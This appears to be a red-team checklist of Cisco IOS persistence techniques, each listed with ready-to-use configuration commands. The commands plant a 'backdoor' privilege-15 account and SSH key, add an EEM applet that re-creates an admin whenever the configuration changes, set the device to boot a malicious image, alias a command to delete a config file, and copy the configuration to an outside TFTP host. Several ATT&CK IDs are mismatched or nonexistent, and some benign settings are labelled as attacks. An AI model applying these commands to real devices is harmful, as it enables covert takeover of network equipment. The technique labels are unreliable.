# Cisco Persistence Techniques

- [ ] **Create Local Administrative User (T1136.001)**  
  ```shell
  configure terminal
  username backdoor privilege 15 secret P@ssw0rd!
  end
  write memory
  ```

- [ ] **Enable Local Authentication Fallback (TA0006)**  
  ```shell
  configure terminal
  aaa authentication login default group tacacs+ local
  end
  write memory
  ```

- [ ] **Configure SNMP Community String (T1647)**  
  ```shell
  configure terminal
  snmp-server community public RO
  end
  write memory
  ```

- [ ] **Archive Configuration to TFTP (T1565.001)**  
  ```shell
  configure terminal
  archive
   path tftp://192.0.2.10/config-backup
   write-memory
  exit
  write memory
  ```

- [ ] **Schedule Automated Backup with Kron (T1053.002)**  
  ```shell
  configure terminal
  kron policy-list backup
   cli write memory
  kron occurrence backup at 0:00 recurring
  exit
  write memory
  ```

- [ ] **Embed Persistence via EEM Applet (T1546.015)**  
  ```shell
  configure terminal
  event manager applet PersistUser
   event syslog pattern "SYS-5-CONFIG_I"
   action 1.0 cli command "enable"
   action 2.0 cli command "configure terminal"
   action 3.0 cli command "username eemadmin privilege 15 secret E3mP@ss"
  exit
  write memory
  ```

- [ ] **Enable HTTP Server for CLI Access (T1071.003)**  
  ```shell
  configure terminal
  ip http server
  ip http authentication local
  end
  write memory
  ```

- [ ] **Configure Telnet and SSH Access (T1078.003)**  
  ```shell
  configure terminal
  line vty 0 4
   transport input telnet ssh
   login local
  end
  write memory
  ```

- [ ] **Import SSH Public Key (T1558.003)**  
  ```shell
  configure terminal
  ip ssh pubkey-chain
   username backdoor
    key-string
     AAAAB3NzaC1yc2E...
    exit
   exit
  end
  write memory
  ```

- [ ] **Persistent CLI via EEM Scheduled Cron (T1053.005)**  
  ```shell
  configure terminal
  event manager scheduler cron name DailyPersist cron-entry "0 0 * * *"
   cli write memory
  exit
  write memory
  ```

- [ ] **Modify Boot System Image (T1542.001)**  
  ```shell
  configure terminal
  boot system flash malicious_image.bin
  end
  write memory
  ```

- [ ] **Enable Secure HTTP Server (T1071.003)**  
  ```shell
  configure terminal
  ip http secure-server
  ip http authentication local
  end
  write memory
  ```

- [ ] **Configure SNMP Trap Receiver (T1589.002)**  
  ```shell
  configure terminal
  snmp-server host 192.0.2.5 traps version 2c public
  end
  write memory
  ```

- [ ] **Create Alias for Malicious Command (T1036.005)**  
  ```shell
  configure terminal
  alias exec lsls delete flash:cisco/chkp.cfg
  end
  write memory
  ```

- [ ] **Persistent IP SLA for C2 Check (T1497.001)**  
  ```shell
  configure terminal
  ip sla 1
   icmp-echo 203.0.113.5 source-interface GigabitEthernet0/1
   frequency 60
  exit
  ip sla schedule 1 life forever start-time now
  end
  write memory
  ```

- [ ] **Change Config Register to Ignore Startup Config (T1547.009)**  
  ```shell
  configure terminal
  config-register 0x2142
  end
  write memory
  ```

- [ ] **Setup Netflow Exporter (T1041)**  
  ```shell
  configure terminal
  ip flow-export destination 203.0.113.10 9996
  end
  write memory
  ```

- [ ] **Configure NAT Port Forwarding (T1571)**  
  ```shell
  configure terminal
  ip nat inside source static tcp 192.168.1.100 80 interface GigabitEthernet0/0 8080
  end
  write memory
  ```

- [ ] **Add Static Route for C2 Persistence (T1021.001)**  
  ```shell
  configure terminal
  ip route 10.10.10.0 255.255.255.0 192.168.1.1
  end
  write memory
  ```

- [ ] **Modify Banner to Obfuscate Access (T1564.002)**  
  ```shell
  configure terminal
  banner login ^C
  Authorized Access Only
  ^C
  end
  write memory
  ```

- [ ] **Enable Persistent Debug Logging (T1562.001)**  
  ```shell
  configure terminal
  logging buffered 64000 debugging
  end
  write memory
  ```

- [ ] **Configure HTTP Port Redirection (T1571)**  
  ```shell
  configure terminal
  ip http secure-server
  ip http authentication local
  ip http port 8080
  end
  write memory
  ```

- [ ] **Persistent DHCP Snooping Bypass (T1018.001)**  
  ```shell
  configure terminal
  no ip dhcp snooping
  end
  write memory
  ```
